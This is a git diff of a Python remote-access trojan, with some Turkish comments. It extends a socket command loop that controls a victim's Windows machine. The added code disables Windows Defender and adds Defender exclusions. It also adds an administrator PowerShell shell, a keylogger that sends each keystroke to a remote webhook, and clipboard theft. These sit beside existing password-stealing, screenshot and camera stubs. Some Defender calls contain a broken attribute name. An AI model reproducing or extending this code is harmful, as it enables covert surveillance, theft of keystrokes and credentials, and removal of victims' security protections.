@@ -1,4 +1,4 @@
-import socket, os, cv2, pyautogui, subprocess, ctypes, sys, shutil, webbrowser, time
+import socket, os, cv2, pyautogui, subprocess, ctypes, sys, shutil, webbrowser, time, requests, json, threading,pynput, pyperclip
 
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
@@ -68,8 +68,7 @@ class Functions:
         self.camera.release()
 
     def steal_password(self):
-        #Detaylı şekilde yapılacak o yüzden eksik...
-        pass
+        return f"{Fore.RED}Error!{Fore.RESET}"
 
     def take_screenshot(self):
         self.screenshot = pyautogui.screenshot("error.png")
@@ -83,6 +82,36 @@ class Functions:
 
     def steal_history(self):
         return f"{Fore.RED}Currently under development!{Fore.RESET}"
+
+    def defender_off(self):
+        try:
+            if ctypes.windll.shell32IsUserAnAdmin():
+                self.defender = subprocess.run("sc stop WinDefend", capture_output=True, text=True, shell=True)
+                return f"{Fore.GREEN}Succsesfully defender off! : {self.defender}{Fore.RESET}"
+            else:
+                return f"{Fore.RED}Error! You have no authority! please increase authorization{Fore.RESET}"
+
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
+    def defender_on(self):
+        try:
+            if ctypes.windll.shell32IsUserAnAdmin():
+                self.defender = subprocess.run("sc start WinDefend", capture_output=True, text=True, shell=True)
+                return f"{Fore.GREEN}Succsesfully defender on!{self.defender}{Fore.RESET}"
+            else:
+                return f"{Fore.RED}Error! You have no authority! please increase authorization{Fore.RESET}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
+    def exclusion(self):
+        try:
+            if ctypes.windll.shell32IsUserAnAdmin():
+                self.exclusion = subprocess.run(['powershell', '-Command', r"Add-MpPreference -ExclusionPath 'C:\Path\To\Your\Application'"],capture_output=True, text=True)
+                return f"{Fore.GREEN}Succsesfully exclusion! {self.exclusion}{Fore.RESET}"
+            else:
+                return f"{Fore.RED}Error! You have no authority! please increase authorization{Fore.RESET}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
     def kill(self, data):
         try:
@@ -146,15 +175,13 @@ class Functions:
 
     def download(self):
         try:
-            #Daha sonra yapılacak o yüzden eksik...
-            pass
+            return f"{Fore.RED}Error!{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
     def upload(self):
         try:
-            #Daha sonra yapılacak o yüzden eksik...
-            pass
+            return f"{Fore.RED}Error!{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
@@ -174,14 +201,24 @@ class Functions:
 
     def shell(self, data):
         try:
-            self.shell = subprocess.run(data, shell=True, capture_output=True, text=True)
+            self.shell = subprocess.run(['powershell', '-Command', data], capture_output=True, text=True)
             return f"{self.shell}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
+    def admin_shell(self, data):
+        try:
+            if ctypes.windll.shell32.IsUserAnAdmin():
+                self.admin_shell = subprocess.run(['runas', '/user:Administrator', 'powershell', '-Command', data],capture_output=True, text=True)
+                return f"{self.admin_shell}"
+            else:
+                return f"{Fore.RED}Error! You have no authority! please increase authorization{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
     def cmd(self, data):
         try:
-            self.cmd = os.system(data)
+            self.cmd = subprocess.run(data, capture_output=True, text=True, shell=True)
             return f"{Fore.GREEN}{self.cmd}{Fore.RESET}"
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
@@ -215,12 +252,27 @@ class Functions:
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
-    def keylogger(self):
+    def keylogger(self, data):
         try:
-            return f"{Fore.GREEN}Currently under development!{Fore.RESET}"
+            if data == "exit" or data == "stop" or data == "pause":
+                return f"{Fore.GREEN}Stopped the keylogger!{Fore.RESET}"
+            else:
+                def emir(key, webhook_url):
+                    harfler = str(key)
+                    a = {
+                        'content': harfler
+                    }
+                    headers = {
+                        'Content-Type': 'application/json'
+                    }
+                    response = requests.post(webhook_url, json=a, headers=headers)
+
+                webhook_url = data
+                listen = pynput.keyboard.Listener(on_press=lambda key: emir(key, webhook_url))
+                with listen:
+                    listen.join()
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
-
     def type(self, data):
         try:
             pyautogui.write(data)
@@ -246,6 +298,14 @@ class Functions:
         try:
             pyautogui.click(button=str(data))
             return f"{Fore.GREEN}Clicked the {data}{Fore.RESET}"
+        except Exception as e:
+            return f"{Fore.RED}Error! {e}{Fore.RESET}"
+
+
+    def clipboard(self):
+        try:
+            self.copied_text = pyperclip.paste()
+            return self.copied_text
         except Exception as e:
             return f"{Fore.RED}Error! {e}{Fore.RESET}"
 
@@ -365,6 +425,10 @@ class Main:
                         data = data[6:]
                         conn.send(f"{Functions.shell(data)}".encode())
 
+                    elif data.startswith("adminshell "):
+                        data = data[11:]
+                        conn.send(f"{Functions.admin_shell(data)}".encode())
+
                     elif data.startswith("cmd "):
                         data = data[4:]
                         conn.send(f"{Functions.cmd(data)}".encode())
@@ -381,8 +445,9 @@ class Main:
                         data = data[5:]
                         conn.send(f"{Functions.ping(data)}".encode())
 
-                    elif data == "keylogger":
-                        conn.send(f"{Functions.keylogger()}".encode())
+                    elif data.startswith("keylogger "):
+                        data = data[10:]
+                        conn.send(f"{Functions.keylogger(data)}".encode())
 
                     elif data.startswith("type "):
                         data = data[5:]
@@ -401,6 +466,22 @@ class Main:
                     elif data.startswith("click "):
                         data = data[6:]
                         conn.send(f"{Functions.click(data)}".encode())
+
+                    elif data.startswith("admin_shell "):
+                        data = data[12:]
+                        conn.send(f"{Functions.admin_shell(data)}".encode())
+
+                    elif data == "exclusion":
+                        conn.send(f"{Functions.exclusion()}".encode())
+
+                    elif data == "defender_off":
+                        conn.send(f"{Functions.defender_off()}".encode())
+
+                    elif data == "defender_on":
+                        conn.send(f"{Functions.defender_on()}".encode())
+
+                    elif data == "clipboard":
+                        conn.send(f"{Functions.clipboard()}".encode())
 
                     elif data == "help" or data == "--help":
                         pass
